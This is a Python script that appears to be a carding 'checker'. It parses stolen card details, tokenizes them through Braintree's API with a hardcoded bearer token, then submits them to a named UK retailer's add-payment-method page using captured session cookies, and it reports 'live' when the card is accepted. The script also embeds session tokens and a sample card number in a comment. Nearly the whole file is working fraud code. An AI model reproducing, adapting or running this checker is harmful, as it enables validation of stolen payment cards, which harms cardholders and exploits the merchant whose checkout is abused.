import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	


	
	










	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTkxMjMyNDIsImp0aSI6IjIzMzRmZDQ3LWI0OTgtNGQ0YS04NjU0LTdlNWI3MmJlOWQ2ZSIsInN1YiI6Ind5cDM1M2NxM3JwOWZtbmMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ind5cDM1M2NxM3JwOWZtbmMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.jpUOmD_ZAzI3UP4VelEVJfPh0Es1vxKYt0SuK5lHcRR9dVJK958Z3bL4lP6YxWlkJlwxfjC3Im0PdJtO7YcNqg',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'b1fb4c50-bc9e-4fdf-9929-813c525ede8d',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"b1fb4c50-bc9e-4fdf-9929-813c525ede8d"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)


	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	
	





















	cookies = {
    'cookieyes-consent': 'consentid:ejJWOUJsU3ZZQUdnaTJmWERjUzJvYVljdzFjenYyaTI,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no,other:no',
    'intercom-id-pl9e89b4': 'da724470-2384-453e-8fd9-ffbdb07b1928',
    'intercom-device-id-pl9e89b4': 'c3022dbc-ff08-42f0-a308-279ef4b027ec',
    'wordpress_logged_in_82a05395de84089a447a0878739347cd': 'bjjjcjjdj%7C1719561953%7C2i4djexwJyMUT8akoKsr7PcuxyDvYRfVClbfTgtNM1w%7C4dbeb84a9b3a4f1392ad29971578c4682909239e57e8ba08983a21c7bdcea7e4',
    'cf_clearance': 'rf4ZTXR3b_nwU.S9do5FuPKzw.7d1.jNxHE4k9Z7ejw-1719036565-1.0.1.1-7lHl8SZgm.CkJAcOho0RHAc7T9spmNv1jpcCRm5VdVXyL6Q6Xy4LV5H7Lar_W5RTvlbcBT8UAij3By4eK.QPzw',
    'intercom-session-pl9e89b4': 'L3NaTmJWdGUrSkNwTkJDb20rZ2pRbTV6aW9IWUJKU0pkeUpYdG8wNmg3T3oyVzZKeFdPUWRENmhlZkk1WTd5Vi0tMjZPUDkvZi90OTQ5NDFBYk1vaUt4Zz09--9bf9c037d70b74d586361b8cb48aafc22fe11af9',
}

	headers = {
    'authority': 'www.naturaw.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'cookieyes-consent=consentid:ejJWOUJsU3ZZQUdnaTJmWERjUzJvYVljdzFjenYyaTI,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no,other:no; intercom-id-pl9e89b4=da724470-2384-453e-8fd9-ffbdb07b1928; intercom-device-id-pl9e89b4=c3022dbc-ff08-42f0-a308-279ef4b027ec; wordpress_logged_in_82a05395de84089a447a0878739347cd=bjjjcjjdj%7C1719561953%7C2i4djexwJyMUT8akoKsr7PcuxyDvYRfVClbfTgtNM1w%7C4dbeb84a9b3a4f1392ad29971578c4682909239e57e8ba08983a21c7bdcea7e4; cf_clearance=rf4ZTXR3b_nwU.S9do5FuPKzw.7d1.jNxHE4k9Z7ejw-1719036565-1.0.1.1-7lHl8SZgm.CkJAcOho0RHAc7T9spmNv1jpcCRm5VdVXyL6Q6Xy4LV5H7Lar_W5RTvlbcBT8UAij3By4eK.QPzw; intercom-session-pl9e89b4=L3NaTmJWdGUrSkNwTkJDb20rZ2pRbTV6aW9IWUJKU0pkeUpYdG8wNmg3T3oyVzZKeFdPUWRENmhlZkk1WTd5Vi0tMjZPUDkvZi90OTQ5NDFBYk1vaUt4Zz09--9bf9c037d70b74d586361b8cb48aafc22fe11af9',
    'origin': 'https://www.naturaw.co.uk',
    'pragma': 'no-cache',
    'referer': 'https://www.naturaw.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-arch': '""',
    'sec-ch-ua-bitness': '""',
    'sec-ch-ua-full-version': '"124.0.6327.4"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"23053RN02A"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'master-card'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', tok,),
    ('wc_braintree_device_data', '{"correlation_id":"f859f0484f9fb8c81ed513b3765126b8"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"f859f0484f9fb8c81ed513b3765126b8"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'GBP'),
    ('wc_braintree_paypal_locale', 'en_gb'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', '8aaa863334'),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

	response = requests.post('https://www.naturaw.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	text=(response.text)
	import re
	pattern = r"Status code \d+: (.+?)\s*</li>"
	
	match = re.search(pattern, text)
	if match:
	    duplicate_message = match.group(1)
	    return duplicate_message
	else:
		if 'Nice! New payment method added' in text:
			return 'live'
		elif 'risk_threshold' in text:
			return 'risk_threshold'
		else:
			print(text)
			return 'risk_threshold'
	
